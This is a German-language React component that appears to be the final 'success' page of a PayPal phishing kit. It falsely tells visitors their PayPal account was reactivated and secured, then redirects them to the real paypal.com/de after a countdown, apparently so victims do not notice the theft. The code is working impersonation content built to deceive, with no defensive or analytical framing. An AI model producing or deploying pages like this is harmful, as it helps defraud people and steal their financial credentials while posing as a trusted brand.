import React, { useEffect, useState } from 'react';
import { CheckCircle2, ShieldCheck, LogOut } from 'lucide-react';
import { motion } from 'motion/react';

export default function SuccessPage() {
  const [countdown, setCountdown] = useState(8);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          window.location.href = 'https://www.paypal.com/de';
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div className="w-full max-w-xl mx-auto px-6 py-12 flex items-center justify-center min-h-[70vh]">
      <motion.div 
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5, ease: "easeOut" }}
        className="bg-white rounded-3xl border border-app-border shadow-2xl p-8 md:p-12 text-center w-full"
      >
        <div className="flex justify-center mb-8">
          <div className="bg-green-50 p-6 rounded-full">
            <CheckCircle2 className="w-16 h-16 text-green-600" />
          </div>
        </div>

        <h1 className="text-3xl font-extrabold text-text-main mb-4 tracking-tight">
          Glückwunsch!
        </h1>
        
        <p className="text-text-muted text-[16px] leading-relaxed mb-6">
          Sie haben Ihr PayPal-Konto <strong className="text-green-600 uppercase">erfolgreich reaktiviert</strong>. 
          Sämtliche Einschränkungen wurden aufgehoben.
        </p>

        <div className="bg-slate-50 border border-slate-100 rounded-2xl p-6 mb-10 flex items-center gap-4 text-left">
          <ShieldCheck className="w-8 h-8 text-primary shrink-0" />
          <p className="text-sm text-slate-600">
            Ihr Konto ist nun wieder vollständig geschützt. Bitte achten Sie zukünftig auf verdächtige E-Mails.
          </p>
        </div>

        <div className="flex flex-col items-center gap-4 py-6 border-t border-slate-100">
          <div className="flex items-center gap-3 text-red-600 font-bold">
            <LogOut className="w-5 h-5 animate-pulse" />
            <span>Sicherheits-Check abgeschlossen</span>
          </div>
          <p className="text-[14px] text-text-muted max-w-[320px]">
            Aus Sicherheitsgründen werden Sie in <span className="text-text-main font-bold">{countdown} Sekunden</span> automatisch abgemeldet.
          </p>
          <div className="w-full max-w-[200px] h-1 bg-slate-100 rounded-full overflow-hidden">
            <motion.div 
              initial={{ width: "100%" }}
              animate={{ width: "0%" }}
              transition={{ duration: 8, ease: "linear" }}
              className="h-full bg-primary"
            />
          </div>
        </div>

        <p className="text-xs text-slate-400 mt-8">
          Vielen Dank, dass Sie den PayPal-Sicherheitsportal nutzen.
        </p>
      </motion.div>
    </div>
  );
}
